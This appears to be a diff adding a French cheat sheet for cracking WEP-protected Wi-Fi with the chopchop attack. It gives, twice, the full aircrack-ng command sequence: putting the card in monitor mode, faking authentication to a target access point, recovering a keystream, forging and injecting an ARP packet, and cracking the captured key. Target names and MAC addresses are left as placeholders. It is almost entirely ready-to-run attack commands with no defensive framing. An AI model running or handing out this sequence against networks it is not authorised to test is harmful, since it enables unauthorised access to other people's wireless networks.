@@ -1,0 +1,46 @@
+1- Carte en mode monitor
+
+2- Verification des points d'acces
+sudo airodump-ng wlan0mon
+
+3- Demarrage airodump pour ecriture fichier (chopchop)
+$ sudo airodump-ng wlan0mon --channel <ch> -w chopchop 
+
+4- Lancement de la fausse authentification.
+$ sudo aireplay-ng -1 0 -e <ESSID> -a <MAC BSSID> -h <MAC kali> wlan0mon
+>>> authentification aupres du point d'acces.
+$ sudo aireplay-ng --chopchop -b <MAC BSSID> -h <MAC kali> wlan0mon
+>>> recherce d'un paquet.
+>>> validation avec y (yes) puis attendre la fin. On note le fichier keystream.
+
+5- Forge d'un paquet.
+$ sudo packetforge-ng -0 -a <MAC BSSID> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. -y <keystream file .xor> -w paquetchopchop
+
+6- Injection du paquet.
+$sudo aireplay-ng -2 -r paquetchopchop walan0mon
+>>> répondre y (yes)
+
+7- Lancement du crack
+$ sudo aircrack-ng chopchop-01.cap
+
+>@
+>@##############################################################
+>@
+>@* Mode monitor
+>@
+>@* Airodump en ecriture 
+>@$ sudo airodump-ng wlan0mon --channel <ch> -w chopchop
+>@
+>@* Traffic
+>@$ sudo aireplay-ng -1 0 -e <ESSID> -a <MAC BSSID> -h <MAC kali> wlan0mon
+>@$ sudo aireplay-ng --chopchop -b <MAC BSSID> -h <MAC kali> wlan0mon
+>@$ sudo packetforge-ng -0 -a <MAC BSSID> -h <MAC kali> -k 255.255.255.255 -l 255.255.255.255. -y <keystream file .xor> -w paquetchopchop
+>@$ sudo aireplay-ng -2 -r paquetchopchop walan0mon
+>@
+>@* Crack
+>@$ sudo aircrack-ng chopchop-01.cap -b <MAC BSSID>
+>@
+>@##############################################################
+>@
+>@
+
